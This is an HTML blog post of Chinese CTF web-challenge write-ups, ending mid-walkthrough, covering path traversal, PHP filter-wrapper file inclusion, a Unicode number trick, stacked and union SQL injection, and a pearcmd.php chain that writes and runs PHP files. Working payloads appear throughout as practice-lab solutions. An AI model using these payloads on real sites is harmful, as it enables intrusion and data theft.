@@ -1,0 +1,1054 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="chiya-66">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="[HCTF 2018]WarmUp这是图给界面，得不出任何信息，我们可以尝试扫描或者查看源码  然后进行访问，在source.php中得到源码,然后在hint.php中得到flag的位置   由这里可知,我们需要通过file形式进行访问 但我们并不知道flag的具体位置，所以可以尝试路径穿越 1source.php?file&#x3D;hint.php?&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ff">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Ctf做题笔记">
+<meta property="og:url" content="https://chiya-66.github.io/2026/08/04/Ctf%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/index.html">
+<meta property="og:site_name" content="Chiya 的博客">
+<meta property="og:description" content="[HCTF 2018]WarmUp这是图给界面，得不出任何信息，我们可以尝试扫描或者查看源码  然后进行访问，在source.php中得到源码,然后在hint.php中得到flag的位置   由这里可知,我们需要通过file形式进行访问 但我们并不知道flag的具体位置，所以可以尝试路径穿越 1source.php?file&#x3D;hint.php?&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ff">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://chiya-66.github.io/images/notes/ctfwp/ctf/media/image1.jpeg">
+<meta property="og:image" content="https://chiya-66.github.io/images/notes/ctfwp/ctf/media/image2.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/notes/ctfwp/ctf/media/image3.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/notes/ctfwp/ctf/media/image4.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/notes/ctfwp/ctf/media/image5.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/notes/ctfwp/ctf/media/image6.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/notes/ctfwp/ctf/media/image7.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/notes/ctfwp/ctf/media/image8.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/notes/ctfwp/ctf/media/image9.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/notes/ctfwp/ctf/media/image10.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/notes/ctfwp/ctf/media/image12.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/notes/ctfwp/ctf/f0a49e05246bef04a7d012e590548dfe.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/notes/ctfwp/ctf/e10687d128f694e21a58eb519f8095dc.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/notes/ctfwp/ctf/10911cb021d7761a607ba735ad4f9089.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/notes/ctfwp/ctf/c96c317b0b760db539b95e79a0e97885.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/notes/ctfwp/ctf/0ee7ca70b355af58f3c2b4db304b7e58.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/notes/ctfwp/ctf/6c1e2af09c1220b355f719740a505833.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/notes/ctfwp/ctf/3f42fda20e63204918334e2aa1240cf8.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/notes/ctfwp/ctf/5a2e262a796de1b509626128b13d7577.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/notes/ctfwp/ctf/e2ea9a612a46f63de1566b378983f5f4.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/notes/ctfwp/ctf/151006e64622a689870287413c69a2ac.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/notes/ctfwp/ctf/57ddb10da48835e64aba1e76be37b28a.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/notes/ctfwp/ctf/567bfdaa143b6cdd9c89b916f0fccac1.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/notes/ctfwp/ctf/image-1.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/notes/ctfwp/ctf/image-2.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/notes/ctfwp/ctf/image-3.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/notes/ctfwp/ctf/image-4.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/notes/ctfwp/ctf/image-5.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/notes/ctfwp/ctf/image-6.png">
+<meta property="og:image" content="https://chiya-66.github.io/image-7.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/notes/ctfwp/ctf/image-8.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/notes/ctfwp/ctf/image-9.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/notes/ctfwp/ctf/image-10.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/notes/ctfwp/ctf/9025f551397ac77f8e51aef1db4cf26f.png">
+<meta property="article:published_time" content="2026-08-04T08:52:00.000Z">
+<meta property="article:modified_time" content="2026-11-07T10:54:29.363Z">
+<meta property="article:author" content="chiya-66">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://chiya-66.github.io/images/notes/ctfwp/ctf/media/image1.jpeg">
+  
+  
+  
+  <title>Ctf做题笔记 - Chiya 的博客</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"chiya-66.github.io","root":"/","version":"1.9.9","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"expand_all":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"openkounter":{"server_url":"https://open-kounter.mintimate.cn","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Chiya 的博客</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content (desktop) -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+<!-- Mobile grid menu overlay -->
+<div id="mobile-grid-menu" class="d-lg-none">
+  <div class="mobile-grid-menu-inner">
+    <div class="container">
+      <div class="row">
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-home-fill"></i>
+                  <span>首页</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/archives/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-archive-fill"></i>
+                  <span>归档</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/categories/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-category-fill"></i>
+                  <span>分类</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/tags/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-tags-fill"></i>
+                  <span>标签</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/about/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-user-fill"></i>
+                  <span>关于</span>
+                </div>
+              </a>
+            </div>
+          
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-search-btn">
+            <a href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-search"></i>
+                <span>搜索</span>
+              </div>
+            </a>
+          </div>
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-color-toggle-btn"
+               data-label-light="开灯"
+               data-label-dark="关灯">
+            <a href="javascript:;" aria-label="Color Toggle">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-dark" id="mobile-color-toggle-icon"></i>
+                <span id="mobile-color-toggle-label">关灯</span>
+              </div>
+            </a>
+          </div>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Ctf做题笔记"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-08-04 16:52" pubdate>
+          2026年8月4日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          9.9k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          83 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Ctf做题笔记</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><p>这是图给界面，得不出任何信息，我们可以尝试扫描或者查看源码</p>
+<p><img src="/images/notes/ctfwp/ctf/media/image1.jpeg" srcset="/img/loading.gif" lazyload alt="image1"></p>
+<p>然后进行访问，在source.php中得到源码,然后在hint.php中得到flag的位置</p>
+<p><img src="/images/notes/ctfwp/ctf/media/image2.png" srcset="/img/loading.gif" lazyload alt="image2"></p>
+<p><img src="/images/notes/ctfwp/ctf/media/image3.png" srcset="/img/loading.gif" lazyload alt="image3"></p>
+<p>由这里可知,我们需要通过file形式进行访问</p>
+<p>但我们并不知道flag的具体位置，所以可以尝试路径穿越</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">source</span>.php?<span class="hljs-keyword">file</span>=hint.php?<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>../ffffllllaaaagggg<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/notes/ctfwp/ctf/media/image4.png" srcset="/img/loading.gif" lazyload alt="image4"></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">CTF2</span>&#123;<span class="hljs-number">9</span>ae84362-<span class="hljs-number">35</span>dc-<span class="hljs-number">4664</span>-<span class="hljs-number">917</span>c-<span class="hljs-number">9</span>c88a360097f&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h2><p>根据题的提示，我们可以知道这是一个文件包含漏洞，读取一下源代码，能猜到flag在flag.php中</p>
+<p><img src="/images/notes/ctfwp/ctf/media/image5.png" srcset="/img/loading.gif" lazyload alt="image5"></p>
+<p>然后尝试一下php伪协议</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">?<span class="hljs-built_in">file</span>=php://<span class="hljs-built_in">filter</span>/<span class="hljs-built_in">convert</span>.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure>
+
+<p>把得到的结果进行base64解码：</p>
+<p><img src="/images/notes/ctfwp/ctf/media/image6.png" srcset="/img/loading.gif" lazyload alt="image6"></p>
+<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">CTF2&#123;a85f4136-<span class="hljs-number">2592</span>-<span class="hljs-number">46e1</span>-<span class="hljs-number">95b1</span>-<span class="hljs-number">04c603cbf356</span>&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h2><p>根据题给提示,我们可以猜测这是unicode的数字欺骗漏洞，漏洞核心原理是</p>
+<p>Unicode中的特殊数字符号（比如古希腊&#x2F;罗马数字）</p>
+<p>这些符号的特点是：字符经过UTF-8编码，strlen()函数将其辨认成一个字符，intval()函数却将翻译成对应的UTF值</p>
+<p>所以我们可以找一个值很大的符号（如U+10124，大于题给值1337即可）</p>
+<p><a target="_blank" rel="noopener" href="https://www.compart.com/en/unicode%E5%9C%A8%E8%BF%99%E9%87%8C%E6%89%BE%E5%8D%B3%E5%8F%AF">https://www.compart.com/en/unicode在这里找即可</a></p>
+<p><img src="/images/notes/ctfwp/ctf/media/image7.png" srcset="/img/loading.gif" lazyload alt="image7"></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">CTF2</span>&#123;<span class="hljs-number">23</span>c2992f-<span class="hljs-number">939</span>f-<span class="hljs-number">4</span>c93-<span class="hljs-number">978</span>d-<span class="hljs-number">1</span>e76632bcd76&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><p>进入后发现是一个提交框</p>
+<p><img src="/images/notes/ctfwp/ctf/media/image8.png" srcset="/img/loading.gif" lazyload alt="image8"></p>
+<p>尝试单引号破坏sql语句后发现sql报错,所以猜测其存在字符型注入，可以依次尝试联合注入，报错注入，堆叠注入以及盲注，这里尝试堆叠注入（因为这里一些关键字被过滤了）</p>
+<p><strong>Payload:</strong></p>
+<p>展示数据库：1’; show databases; #</p>
+<p>展示表单名：1’; show tables; #</p>
+<p><img src="/images/notes/ctfwp/ctf/media/image9.png" srcset="/img/loading.gif" lazyload alt="image9"></p>
+<p>发现有两个表，我们先看看word的表，我们尝试读取他，看里面是否有什么有用的信息</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-number">1</span>&#x27;; show columns <span class="hljs-keyword">from</span> <span class="hljs-built_in">words</span>; <span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
+
+<p>再去看看那个全是数字的表</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-number">1</span>&#x27;; show columns <span class="hljs-keyword">from</span> `<span class="hljs-number">1919810931114514</span>`; <span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/notes/ctfwp/ctf/media/image10.png" srcset="/img/loading.gif" lazyload alt="image10"></p>
+<p>然后我们可以使用MySQL 的 HANDLER 语句攻击链，用于绕过常规SQL注入防护直接读取数据</p>
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-number">1</span>&#x27;;HANDLER FlagHere <span class="hljs-keyword">OPEN</span>; HANDLER FlagHere READ FIRST; HANDLER FlagHere <span class="hljs-built_in">CLOSE</span>;<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p><strong>1’;</strong> 终止原SQL查询，开启新语句（经典注入手法）。</p>
+<p><strong>HANDLER FlagHere OPEN;</strong> 以底层文件方式打开名为 FlagHere 的表（类似文件句柄）。</p>
+<p><strong>HANDLER FlagHere READ FIRST;</strong> 读取表的第一行数据（无需SELECT权限）。</p>
+<p><strong>HANDLER FlagHere CLOSE;</strong> 关闭表句柄。</p>
+<p><strong>#</strong> 注释掉后续语句，避免语法错误。</p>
+<blockquote>
+<p>也就是说，这个需要在有表单名的情况下才能使用</p>
+</blockquote>
+<p>然后注入payload:</p>
+<figure class="highlight julia"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs julia"><span class="hljs-number">1</span>&#x27;;HANDLER <span class="hljs-string">`1919810931114514`</span> OPEN; HANDLER <span class="hljs-string">`1919810931114514`</span> READ FIRST; HANDLER <span class="hljs-string">`1919810931114514`</span> CLOSE;<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/notes/ctfwp/ctf/media/image12.png" srcset="/img/loading.gif" lazyload alt="image11"></p>
+<h2 id="【HNctf2026】include"><a href="#【HNctf2026】include" class="headerlink" title="【HNctf2026】include"></a>【HNctf2026】include</h2><p>这个网站有一个”模板预览”功能，你可以在网址后面加 <code>?file=pages/home.php</code> 来切换显示不同的页面。但它有个漏洞——它可以读取服务器上的任何 PHP 文件。</p>
+<h3 id="网站做了哪些防护？"><a href="#网站做了哪些防护？" class="headerlink" title="网站做了哪些防护？"></a>网站做了哪些防护？</h3><p>网站怕被人乱搞，加了三个限制：</p>
+<ol>
+<li><strong>文件名必须以 <code>.php</code> 结尾</strong> — 防止读取密码文件等非 PHP 文件</li>
+<li><strong>不能有 <code>..</code></strong> — 防止你返回上级目录</li>
+<li><strong>不能有 <code>://</code></strong> — 防止你用 <code>php://</code>、<code>file://</code> 等特殊协议</li>
+</ol>
+<h3 id="那黑客是怎么绕过的？"><a href="#那黑客是怎么绕过的？" class="headerlink" title="那黑客是怎么绕过的？"></a>那黑客是怎么绕过的？</h3><p>黑客发现服务器上有一个”隐藏工具”叫 <strong>pearcmd.php</strong>，它在 <code>/usr/local/lib/php/pearcmd.php</code> 这个位置。</p>
+<p><strong>这个工具是干嘛的？</strong> 它是 PHP 自带的”软件管家”，用来安装 PHP 扩展包的。本来是在命令行用的。</p>
+<p><strong>为什么它能用？</strong> 因为它本身就是一个 <code>.php</code> 文件，路径里没有 <code>..</code> 也没有 <code>://</code>，所以三个限制都通过了！</p>
+<h3 id="具体怎么搞？"><a href="#具体怎么搞？" class="headerlink" title="具体怎么搞？"></a>具体怎么搞？</h3><p><strong>第1步：让”软件管家”帮我们写一个文件</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">?file=<span class="hljs-regexp">/usr/</span>local/lib/php/pearcmd.<span class="hljs-property">php</span>&amp;+config-create+<span class="hljs-regexp">/&lt;?=scandir(&quot;/</span><span class="hljs-string">&quot;);?&gt;+/tmp/ls.php</span><br></code></pre></td></tr></table></figure>
+
+<p>这句话的意思是：</p>
+<ul>
+<li><code>file=...pearcmd.php</code> → 让网站加载这个”软件管家”</li>
+<li><code>config-create</code> → 告诉软件管家：”帮我创建一个配置文件”</li>
+<li><code>&lt;?=scandir(&quot;/&quot;);?&gt;</code> → 配置文件&#x7684;<strong>&#x5185;&#x5BB9;</strong>&#x662F;一段 PHP 代码，功能是”列出根目录下所有文件”</li>
+<li><code>/tmp/ls.php</code> → 把这个配置文件保存到 <code>/tmp/ls.php</code></li>
+</ul>
+<p><strong>第2步：查看刚才生成的文件</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">?file=<span class="hljs-regexp">/tmp/</span>ls.<span class="hljs-property">php</span><br></code></pre></td></tr></table></figure>
+
+<p>网站加载 <code>/tmp/ls.php</code>，里面的 PHP 代码就会执行，显示出根目录下有哪些文件。这时候就能看到有一个叫 <code>/flag</code> 的文件。</p>
+<p><strong>第3步：读取 flag 文件</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">?file=<span class="hljs-regexp">/usr/</span>local/lib/php/pearcmd.<span class="hljs-property">php</span>&amp;+config-create+<span class="hljs-regexp">/&lt;?=file_get_contents(&quot;/</span>flag<span class="hljs-string">&quot;);?&gt;+/tmp/flag.php</span><br></code></pre></td></tr></table></figure>
+
+<p>这次让”软件管家”再写一个文件，内容是”读取 &#x2F;flag 文件的内容”。</p>
+<p><strong>第4步：查看 flag</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">?file=<span class="hljs-regexp">/tmp/</span>flag.<span class="hljs-property">php</span><br></code></pre></td></tr></table></figure>
+
+<p>网站加载 <code>/tmp/flag.php</code>，里面的代码执行，显示出 flag 的内容。</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>网站只检查了 <code>file=</code> 这个参数是否合法，但没检查后面跟着的其他参数。黑客利用这个疏忽，通过 PHP 自带的”软件管家”工具，把恶意代码写入到服务器上，然后再加载执行，最终拿到了 flag。</p>
+<hr>
+<h2 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h2><p>进去之后发现是一个登录页面，尝试注入后，发现存在sql漏洞</p>
+<p><img src="/images/notes/ctfwp/ctf/f0a49e05246bef04a7d012e590548dfe.png" srcset="/img/loading.gif" lazyload alt="alt text"></p>
+<p><img src="/images/notes/ctfwp/ctf/e10687d128f694e21a58eb519f8095dc.png" srcset="/img/loading.gif" lazyload alt="alt text"></p>
+<p>尝试注入payload:</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; or <span class="hljs-number">1</span>=<span class="hljs-number">1</span> #<br></code></pre></td></tr></table></figure>
+<p>发现出现了一串神秘符号，但没什么用<br><img src="/images/notes/ctfwp/ctf/10911cb021d7761a607ba735ad4f9089.png" srcset="/img/loading.gif" lazyload alt="alt text"></p>
+<h3 id="接下来进行传统的注入流程即可："><a href="#接下来进行传统的注入流程即可：" class="headerlink" title="接下来进行传统的注入流程即可："></a>接下来进行传统的注入流程即可：</h3><p>|<strong>1.用 order by 子句确定数据表字段数</strong></p>
+<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-attr">id=</span><span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">1</span> <span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
+<p>依次尝试，发现其字段数为3（4的时候未发现结果）<br><img src="/images/notes/ctfwp/ctf/c96c317b0b760db539b95e79a0e97885.png" srcset="/img/loading.gif" lazyload alt="alt text"></p>
+<p><strong>2.字段数确定后，构造 union select 语句提取数据库信息</strong></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">id</span>=-<span class="hljs-number">1</span>&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> #<br></code></pre></td></tr></table></figure>
+
+<p>找到对应字段的位置<br><img src="/images/notes/ctfwp/ctf/0ee7ca70b355af58f3c2b4db304b7e58.png" srcset="/img/loading.gif" lazyload alt="alt text"></p>
+<p><strong>3.提取基础数据库信息</strong></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">id</span>=-<span class="hljs-number">1</span>&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,database() #<br></code></pre></td></tr></table></figure>
+<p><img src="/images/notes/ctfwp/ctf/6c1e2af09c1220b355f719740a505833.png" srcset="/img/loading.gif" lazyload alt="alt text"><br>了解到database的名称 ‘geek’</p>
+<p><strong>4.提取 security 数据库的所有表名:</strong></p>
+<figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs q">?id=<span class="hljs-number">-1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> <span class="hljs-built_in">where</span> table_schema=&#x27;geek&#x27; #<br></code></pre></td></tr></table></figure>
+<p><img src="/images/notes/ctfwp/ctf/3f42fda20e63204918334e2aa1240cf8.png" srcset="/img/loading.gif" lazyload alt="alt text"></p>
+<p>找到表名geekuser,l0ve1ysq1</p>
+<p><strong>5.提取列名</strong></p>
